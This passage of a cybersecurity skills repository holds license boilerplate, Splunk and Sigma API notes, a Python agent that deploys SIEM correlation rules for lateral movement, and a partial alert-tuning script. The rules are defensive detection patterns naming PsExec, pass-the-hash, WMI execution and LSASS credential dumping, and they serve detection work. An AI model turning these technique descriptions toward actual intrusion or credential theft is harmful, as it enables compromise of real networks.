      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-siem-correlation-rules-for-apt/references/api-reference.md =====
# API Reference: SIEM Correlation Rules for APT

## Splunk REST API

### Authentication
```
POST /services/auth/login
Body: username=<user>&password=<pass>
Returns: { "sessionKey": "<token>" }
Header: Authorization: Splunk <sessionKey>
```

### Saved Searches (Correlation Rules)
```
POST /services/saved/searches
Parameters: name, search, cron_schedule, dispatch.earliest_time,
  dispatch.latest_time, alert.severity, action.notable (1=enabled),
  action.notable.param.severity, action.notable.param.security_domain
GET /services/saved/searches?output_mode=json&count=0
```

### Search Jobs
```
POST /services/search/jobs
Body: search=<SPL>, earliest_time, latest_time, output_mode=json
Returns: { "sid": "<job_id>" }
GET /services/search/jobs/<sid>?output_mode=json
GET /services/search/jobs/<sid>/results?output_mode=json&count=<n>
```

## Sigma Rule Format (YAML)
```yaml
title: <string>
status: experimental|test|stable
logsource:
  product: windows
  service: sysmon|security
detection:
  selection: { EventID: [1,3] }
  condition: selection
level: low|medium|high|critical
tags: [attack.t1021.001]
```

## sigma-cli Conversion
```bash
sigma convert -t splunk -p sysmon rule.yml
sigma convert -t elastic-eql -p sysmon rule.yml
```

## Key Windows Event IDs for Lateral Movement
| Event ID | Source | Description |
|----------|--------|-------------|
| 4624 | Security | Logon event (Type 3=Network, 10=RDP) |
| 4648 | Security | Explicit credential logon |
| 4688 | Security | Process creation |
| 7045 | System | Service installation |
| 1 | Sysmon | Process creation with hashes |
| 3 | Sysmon | Network connection |
| 10 | Sysmon | Process access (LSASS) |
| 17/18 | Sysmon | Named pipe created/connected |

===== END FILE =====


===== FILE: skills/implementing-siem-correlation-rules-for-apt/scripts/agent.py =====
#!/usr/bin/env python3
"""SIEM Correlation Rules Agent - Builds and deploys multi-event APT detection rules via Splunk and Sigma."""

import json
import os
import time
import logging
import argparse
from datetime import datetime

import yaml
import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

LATERAL_MOVEMENT_RULES = [
    {
        "name": "RDP Lateral Movement Chain",
        "description": "RDP logon followed by service installation on same host within 15 minutes",
        "spl": (
            'index=wineventlog (EventCode=4624 Logon_Type=10) OR (EventCode=7045) '
            '| transaction Computer maxspan=15m startswith=(EventCode=4624) endswith=(EventCode=7045) '
            '| where eventcount >= 2 '
            '| table _time Computer Account_Name ServiceName'
        ),
        "severity": "high",
        "mitre": "T1021.001",
    },
    {
        "name": "PsExec Service Installation",
        "description": "Named pipe PSEXESVC created followed by remote service install",
        "spl": (
            'index=sysmon (EventCode=17 PipeName="\\\\PSEXESVC*") OR '
            '(index=wineventlog EventCode=7045 ServiceFileName="*PSEXESVC*") '
            '| transaction Computer maxspan=5m '
            '| where eventcount >= 2 '
            '| table _time Computer User Image ServiceName'
        ),
        "severity": "high",
        "mitre": "T1021.002",
    },
    {
        "name": "NTLM Pass-the-Hash Followed by Admin Tool",
        "description": "NTLM network logon followed by admin tool execution within 10 minutes",
        "spl": (
            'index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package=NTLM '
            '| join Computer maxspan=10m [search index=sysmon EventCode=1 '
            '(Image="*\\\\net.exe" OR Image="*\\\\net1.exe" OR Image="*\\\\wmic.exe" '
            'OR Image="*\\\\psexec.exe" OR Image="*\\\\powershell.exe")] '
            '| table _time Computer Account_Name Image CommandLine'
        ),
        "severity": "critical",
        "mitre": "T1550.002",
    },
    {
        "name": "WMI Remote Execution Chain",
        "description": "WMI process creation on remote host correlated with network logon",
        "spl": (
            'index=sysmon EventCode=1 ParentImage="*\\\\WmiPrvSE.exe" '
            '| join Computer [search index=wineventlog EventCode=4624 Logon_Type=3] '
            '| where Account_Name!="-" '
            '| stats count by Computer, Account_Name, Image, CommandLine '
            '| where count > 0'
        ),
        "severity": "high",
        "mitre": "T1047",
    },
    {
        "name": "Credential Dumping After Lateral Move",
        "description": "Network logon followed by LSASS access within 30 minutes",
        "spl": (
            'index=wineventlog EventCode=4624 Logon_Type=3 '
            '| join Computer maxspan=30m [search index=sysmon EventCode=10 '
            'TargetImage="*\\\\lsass.exe" GrantedAccess=0x1010] '
            '| table _time Computer Account_Name SourceImage GrantedAccess'
        ),
        "severity": "critical",
        "mitre": "T1003.001",
    },
]


def authenticate_splunk(base_url, username, password):
    """Authenticate to Splunk and return session headers."""
    resp = requests.post(
        f"{base_url}/services/auth/login",
        data={"username": username, "password": password},
        verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
        timeout=30,
    )
    resp.raise_for_status()
    session_key = resp.json()["sessionKey"]
    logger.info("Authenticated to Splunk")
    return {"Authorization": f"Splunk {session_key}"}


def deploy_correlation_search(base_url, headers, rule):
    """Deploy a correlation search to Splunk ES."""
    search_payload = {
        "search": f"search {rule['spl']}",
        "name": rule["name"],
        "description": rule["description"],
        "cron_schedule": "*/15 * * * *",
        "dispatch.earliest_time": "-15m",
        "dispatch.latest_time": "now",
        "alert_type": "always",
        "alert.severity": "4" if rule["severity"] == "critical" else "3",
        "action.notable": "1",
        "action.notable.param.security_domain": "threat",
        "action.notable.param.severity": rule["severity"],
        "action.notable.param.rule_title": rule["name"],
    }
    resp = requests.post(
        f"{base_url}/services/saved/searches",
        headers=headers,
        data=search_payload,
        verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
        timeout=30,
    )
    if resp.status_code in (200, 201):
        logger.info("Deployed correlation search: %s", rule["name"])
        return True
    logger.warning("Deploy failed for %s: %d %s", rule["name"], resp.status_code, resp.text[:100])
    return False


def generate_sigma_rule(rule):
    """Generate a Sigma-format YAML rule from a correlation definition."""
    sigma = {
        "title": rule["name"],
        "id": None,
        "status": "experimental",
        "description": rule["description"],
        "references": [f"https://attack.mitre.org/techniques/{rule['mitre']}/"],
        "logsource": {"product": "windows", "service": "sysmon"},
        "detection": {
            "selection": {"EventID": [1, 3, 17, 18]},
            "condition": "selection",
        },
        "level": rule["severity"],
        "tags": [f"attack.{rule['mitre'].lower()}"],
    }
    return yaml.dump(sigma, default_flow_style=False, sort_keys=False)


def audit_existing_searches(base_url, headers):
    """Audit existing Splunk saved searches for coverage gaps."""
    resp = requests.get(
        f"{base_url}/services/saved/searches",
        headers=headers,
        params={"output_mode": "json", "count": 0},
        verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
        timeout=30,
    )
    if resp.status_code != 200:
        return []
    searches = resp.json().get("entry", [])
    mitre_covered = set()
    for s in searches:
        content = s.get("content", {})
        search_text = content.get("search", "").lower()
        for technique in ["t1021", "t1047", "t1053", "t1550", "t1003"]:
            if technique in search_text or technique in s.get("name", "").lower():
                mitre_covered.add(technique)
    lateral_techniques = {"t1021", "t1047", "t1053", "t1550", "t1003", "t1059", "t1570"}
    gaps = lateral_techniques - mitre_covered
    logger.info("Coverage: %d/%d lateral movement techniques covered", len(mitre_covered), len(lateral_techniques))
    return list(gaps)


def run_test_search(base_url, headers, spl, earliest="-24h"):
    """Execute a correlation search and return matching events."""
    resp = requests.post(
        f"{base_url}/services/search/jobs",
        headers=headers,
        data={"search": f"search {spl}", "earliest_time": earliest, "output_mode": "json"},
        verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
        timeout=30,
    )
    resp.raise_for_status()
    sid = resp.json()["sid"]
    for _ in range(60):
        status = requests.get(
            f"{base_url}/services/search/jobs/{sid}",
            headers=headers, params={"output_mode": "json"},
            verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
            timeout=30,
        ).json()
        if status["entry"][0]["content"]["isDone"]:
            break
        time.sleep(2)
    results = requests.get(
        f"{base_url}/services/search/jobs/{sid}/results",
        headers=headers, params={"output_mode": "json", "count": 50},
        verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true",  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
        timeout=30,
    ).json()
    return results.get("results", [])


def generate_report(deployed, gaps, test_results):
    """Generate correlation rules deployment report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "rules_deployed": deployed,
        "coverage_gaps": gaps,
        "test_results_summary": {r["name"]: len(r.get("hits", [])) for r in test_results},
    }
    print(f"CORRELATION RULES REPORT: {len(deployed)} deployed, {len(gaps)} gaps")
    return report


def main():
    parser = argparse.ArgumentParser(description="SIEM Correlation Rules Agent")
    parser.add_argument("--splunk-url", default=os.environ.get("SPLUNK_URL", "https://localhost:8089"))
    parser.add_argument("--username", default="admin")
    parser.add_argument("--password", required=True)
    parser.add_argument("--deploy", action="store_true", help="Deploy rules to Splunk")
    parser.add_argument("--test", action="store_true", help="Test rules against recent data")
    parser.add_argument("--sigma-export", help="Export rules as Sigma YAML to directory")
    parser.add_argument("--output", default="correlation_report.json")
    args = parser.parse_args()

    headers = authenticate_splunk(args.splunk_url, args.username, args.password)
    deployed = []
    test_results = []

    if args.deploy:
        for rule in LATERAL_MOVEMENT_RULES:
            if deploy_correlation_search(args.splunk_url, headers, rule):
                deployed.append(rule["name"])

    if args.test:
        for rule in LATERAL_MOVEMENT_RULES:
            hits = run_test_search(args.splunk_url, headers, rule["spl"])
            test_results.append({"name": rule["name"], "hits": hits})
            logger.info("Rule '%s': %d hits", rule["name"], len(hits))

    if args.sigma_export:
        import os
        os.makedirs(args.sigma_export, exist_ok=True)
        for rule in LATERAL_MOVEMENT_RULES:
            sigma_yaml = generate_sigma_rule(rule)
            fname = rule["name"].lower().replace(" ", "_") + ".yml"
            with open(os.path.join(args.sigma_export, fname), "w") as f:
                f.write(sigma_yaml)
        logger.info("Exported %d Sigma rules", len(LATERAL_MOVEMENT_RULES))

    gaps = audit_existing_searches(args.splunk_url, headers)
    report = generate_report(deployed, gaps, test_results)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-siem-use-case-tuning/SKILL.md =====
---
name: implementing-siem-use-case-tuning
description: Tune SIEM detection rules in Splunk and Elastic to reduce false positives
  by analyzing alert volumes, creating context-aware exclusion lists, adjusting
  thresholds against environmental baselines, and measuring precision/recall efficacy
  metrics. Use when a SOC is drowning in noisy alerts and needs to tune correlation
  searches or detection rules, or when measuring and reporting alert-to-incident
  conversion rates.
domain: cybersecurity
subdomain: security-operations
tags:
- siem
- detection-engineering
- false-positive-reduction
- splunk
- elastic
- alert-tuning
- soc
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1685.002
- T1685.005
---

# Implementing SIEM Use Case Tuning

## Overview

SIEM use case tuning reduces alert fatigue by systematically analyzing detection rules for false positive rates, adjusting thresholds based on environmental baselines, creating context-aware whitelists, and measuring detection efficacy through precision/recall metrics. This skill covers tuning workflows for Splunk correlation searches and Elastic detection rules, including statistical baselining, exclusion list management, and alert-to-incident conversion tracking.


## When to Use

- When deploying or configuring implementing siem use case tuning capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Splunk Enterprise/Cloud with ES or Elastic SIEM with detection rules enabled
- Historical alert data (minimum 30 days) for baseline analysis
- Python 3.8+ with `requests` library
- SIEM admin credentials or API tokens

## Steps

1. Export current alert volumes per detection rule from SIEM
2. Calculate false positive rate per rule using analyst disposition data
3. Identify top noise-generating rules by volume and FP rate
4. Build environmental baselines for thresholds (e.g., login counts, process spawns)
5. Create whitelist entries for known-good entities (service accounts, scanners)
6. Adjust rule thresholds using statistical analysis (mean + N standard deviations)
7. Measure tuning impact via before/after precision and alert-to-incident ratio

## Expected Output

JSON report with per-rule tuning recommendations including current FP rate, suggested threshold adjustments, whitelist entries, and projected alert reduction percentages.

===== END FILE =====


===== FILE: skills/implementing-siem-use-case-tuning/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-siem-use-case-tuning/references/api-reference.md =====
# SIEM Use Case Tuning API Reference

## Splunk Notable Event Export

### Export Notables via SPL
```spl
| inputlookup notable_events
| search status_label IN ("New", "In Progress", "Resolved")
| table rule_name, _time, status_label, src, dest, user, urgency
| rename status_label as disposition, _time as timestamp
| outputlookup alert_export.csv
```

### Splunk ES Correlation Search Tuning
```spl
# Measure FP rate per correlation search over 30 days
| inputlookup notable_events where earliest=-30d
| eval is_fp=if(status_label="Resolved" AND disposition="False Positive", 1, 0)
| stats count as total, sum(is_fp) as fp_count by rule_name
| eval fp_rate=round(fp_count/total, 4)
| sort -fp_rate
```

### Update Correlation Search Threshold
```
POST /servicesNS/nobody/SplunkEnterpriseSecuritySuite/saved/searches/{search_name}
Content-Type: application/x-www-form-urlencoded

search=<updated_spl_with_new_threshold>
```

## Elastic Detection Rule Tuning

### List Detection Rules
```
GET /_security/detection_engine/rules/_find?per_page=100
Authorization: ApiKey <base64_api_key>
```

### Add Exception to Rule
```json
POST /_security/detection_engine/rules/exceptions
{
  "rule_id": "rule-uuid",
  "name": "Whitelist scanner IPs",
  "entries": [
    {
      "field": "source.ip",
      "operator": "is_one_of",
      "value": ["10.0.1.50", "10.0.1.51"],
      "type": "match_any"
    }
  ]
}
```

### Query Rule Execution Stats (Kibana)
```kql
event.kind: "signal" AND kibana.alert.rule.name: "Brute Force Detection"
| stats count by kibana.alert.workflow_status
```

## Alert Tuning Metrics

| Metric | Formula | Target |
|---|---|---|
| False Positive Rate | FP / (FP + TP) | < 30% |
| Precision | TP / (TP + FP) | > 70% |
| Alert-to-Incident Ratio | Incidents / Total Alerts | > 20% |
| Mean Time to Triage | avg(triage_end - alert_time) | < 15 min |

## CLI Usage

```bash
# Analyze alert CSV export
python agent.py --alert-csv notable_export.csv --output tuning.json

# Adjust FP threshold for whitelist candidates
python agent.py --alert-csv alerts.csv --fp-threshold 0.9 --top-rules 10

# CSV format: rule_name,timestamp,disposition,source,user,severity
```

===== END FILE =====


===== FILE: skills/implementing-siem-use-case-tuning/scripts/agent.py =====
#!/usr/bin/env python3
"""SIEM use case tuning agent - analyzes alert data to reduce false positives and optimize detection rules."""

import json
import csv
import math
import argparse
from collections import defaultdict
from datetime import datetime


def load_alert_data(filepath):
    """Load alert/notable event export (CSV with columns: rule_name, timestamp, disposition, source, user)."""
    alerts = []
    with open(filepath, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            alerts.append({
                "rule_name": row.get("rule_name", row.get("search_name", "")),
                "timestamp": row.get("timestamp", row.get("_time", "")),
                "disposition": row.get("disposition", row.get("status", "unknown")),
                "source": row.get("source", row.get("src", "")),
                "user": row.get("user", row.get("dest_user", "")),
                "severity": row.get("severity", "medium"),
            })
    return alerts


def calculate_rule_metrics(alerts):
    """Calculate per-rule alert volume, FP rate, and disposition breakdown."""
    rule_stats = defaultdict(lambda: {"total": 0, "true_positive": 0, "false_positive": 0,
                                       "pending": 0, "sources": set(), "users": set()})
    for alert in alerts:
        rule = alert["rule_name"]
        rule_stats[rule]["total"] += 1
        disp = alert["disposition"].lower()
        if disp in ("true_positive", "tp", "confirmed", "escalated"):
            rule_stats[rule]["true_positive"] += 1
        elif disp in ("false_positive", "fp", "benign", "closed_fp"):
            rule_stats[rule]["false_positive"] += 1
        else:
            rule_stats[rule]["pending"] += 1
        if alert["source"]:
            rule_stats[rule]["sources"].add(alert["source"])
        if alert["user"]:
            rule_stats[rule]["users"].add(alert["user"])

    metrics = []
    for rule, stats in rule_stats.items():
        reviewed = stats["true_positive"] + stats["false_positive"]
        fp_rate = stats["false_positive"] / reviewed if reviewed > 0 else 0.0
        precision = stats["true_positive"] / reviewed if reviewed > 0 else 0.0
        metrics.append({
            "rule_name": rule,
            "total_alerts": stats["total"],
            "true_positives": stats["true_positive"],
            "false_positives": stats["false_positive"],
            "pending": stats["pending"],
            "fp_rate": round(fp_rate, 4),
            "precision": round(precision, 4),
            "unique_sources": len(stats["sources"]),
            "unique_users": len(stats["users"]),
            "top_sources": list(stats["sources"])[:10],
        })
    return sorted(metrics, key=lambda x: x["fp_rate"], reverse=True)


def identify_whitelist_candidates(alerts, fp_threshold=0.8):
    """Identify source/user pairs that consistently trigger FPs for a given rule."""
    rule_source_stats = defaultdict(lambda: defaultdict(lambda: {"tp": 0, "fp": 0}))
    for alert in alerts:
        disp = alert["disposition"].lower()
        key = alert["source"] or alert["user"]
        if not key:
            continue
        if disp in ("false_positive", "fp", "benign", "closed_fp"):
            rule_source_stats[alert["rule_name"]][key]["fp"] += 1
        elif disp in ("true_positive", "tp", "confirmed", "escalated"):
            rule_source_stats[alert["rule_name"]][key]["tp"] += 1

    candidates = []
    for rule, sources in rule_source_stats.items():
        for source, counts in sources.items():
            total = counts["tp"] + counts["fp"]
            if total >= 3 and counts["fp"] / total >= fp_threshold:
                candidates.append({
                    "rule_name": rule,
                    "entity": source,
                    "fp_count": counts["fp"],
                    "tp_count": counts["tp"],
                    "fp_ratio": round(counts["fp"] / total, 4),
                    "recommendation": "Add to whitelist" if counts["tp"] == 0 else "Review before whitelisting",
                })
    return sorted(candidates, key=lambda x: x["fp_count"], reverse=True)


def compute_threshold_recommendation(alerts, rule_name, field="total"):
    """Compute statistical threshold for a rule based on hourly alert distribution."""
    hourly_counts = defaultdict(int)
    for alert in alerts:
        if alert["rule_name"] != rule_name:
            continue
        try:
            dt = datetime.fromisoformat(alert["timestamp"].replace("Z", "+00:00"))
